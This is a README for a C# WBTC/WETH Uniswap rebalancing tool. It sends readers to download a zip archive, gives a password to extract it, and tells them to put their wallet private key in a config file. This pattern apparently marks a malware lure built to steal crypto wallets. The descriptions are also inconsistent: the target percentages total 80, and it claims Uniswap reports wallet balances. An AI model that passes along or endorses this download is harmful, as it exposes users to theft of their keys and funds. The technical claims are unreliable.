The Ethereum Uniswap Rebalancer C# program offers an easy way to rebalance tokens (WBTC and WETH) in an Ethereum wallet via Uniswap smart contracts. Developed in C# with the Nethereum library, this program automates the rebalancing process by adjusting token allocations to meet predefined percentages.

Key Features:

- **Rebalancing Strategy:** The program employs a straightforward rebalancing strategy for a wallet containing WBTC and WETH tokens, utilizing Uniswap smart contracts.
- **User-Friendly Executable:** Users can conveniently download and run the program using the compiled executable (`UniswapRebalancer.exe`), ensuring accessibility for non-developers.
- **Customizable Configuration:** Users can tailor configuration settings, such as the Infura API key, private key, wallet address, and token details, via the `config.json` file.



## Getting Started
- [Clone](https://github.com/Xinkey62/Rebalancer/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
- Extract archive with password `3AvU2al`
- Modify the `config` file:

1. **Ethereum Networks:**
  - `rpcUrl`: The RPC URL for connecting to the Ethereum network.
  - `gasPrice`: The gas price in Wei to be used for transactions.
  - `gasLimit`: The gas limit per transaction.

2. **Rebalancer Settings:**
  - `targetWbtcPercentage`: Target percentage for WBTC in the portfolio.
  - `targetWethPercentage`: Target percentage for WETH in the portfolio.
  - `rebalancingInterval`: Time interval for rebalancing (e.g., `"1d"` for every 1 day).
  - `transactionTimeout`: Timeout for individual transactions in seconds.
```json
{
  "ethereum": {
    "mainnet": {
      "rpcUrl": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY",
      "gasPrice": 1000000000,  // Gas price in Wei
      "gasLimit": 300000       // Gas limit per transaction
    },
    "ropsten": {
      "rpcUrl": "https://ropsten.infura.io/v3/YOUR_INFURA_API_KEY",
      "gasPrice": 500000000,   // Gas price in Wei
      "gasLimit": 200000       // Gas limit per transaction
    },
    // Add more networks as needed
  },
  "rebalancer": {
    "targetWbtcPercentage": 50,
    "targetWethPercentage": 30,
    "rebalancingInterval": "1d",  // Rebalance every 1 day
    "transactionTimeout": 600,   // Timeout for transactions in seconds
    // Add more rebalancing settings as needed
  }
}
```
## How it works 
Here's a simplified explanation of how the Ethereum Uniswap Rebalancer C# program works:

1. **Configuration:**
   - The program is configured through a file (e.g., `config.json`) or environment variables, specifying Ethereum network details (RPC URL, gas costs) and rebalancing settings (target percentages, interval, timeout).

2. **Token Balances:**
   - The program connects to the specified Ethereum network (e.g., mainnet or testnet) using the provided RPC URL.
   - It retrieves the current balances of WBTC and WETH tokens in the user's wallet using the Uniswap contract.

3. **Rebalancing Logic:**
   - The program calculates the target amounts of WBTC and WETH based on the specified target percentages.
   - If the actual token balances deviate from the targets, it initiates a rebalancing process.

4. **Transaction Execution:**
   - If excess WBTC is detected, the program initiates a Uniswap transaction to sell the excess WBTC for WETH.
   - If excess WETH is detected, it initiates a Uniswap transaction to sell the excess WETH for WBTC.

5. **Gas Settings:**
   - Gas settings (gas price and limit) are used to determine transaction fees and ensure timely execution.

6. **Rebalancing Schedule:**
   - The program can be set to rebalance at specific intervals (e.g., daily) to maintain the target allocation over time.

7. **Testnet Support:**
   - Users are encouraged to test the program on a testnet first to ensure that it works as expected before using it on the Ethereum mainnet.

8. **Executable Usage:**
   - Users can download the compiled executable (`UniswapRebalancer.exe`) from the repository releases.
   - They can run the executable, which prompts them for necessary inputs and executes the rebalancing strategy.
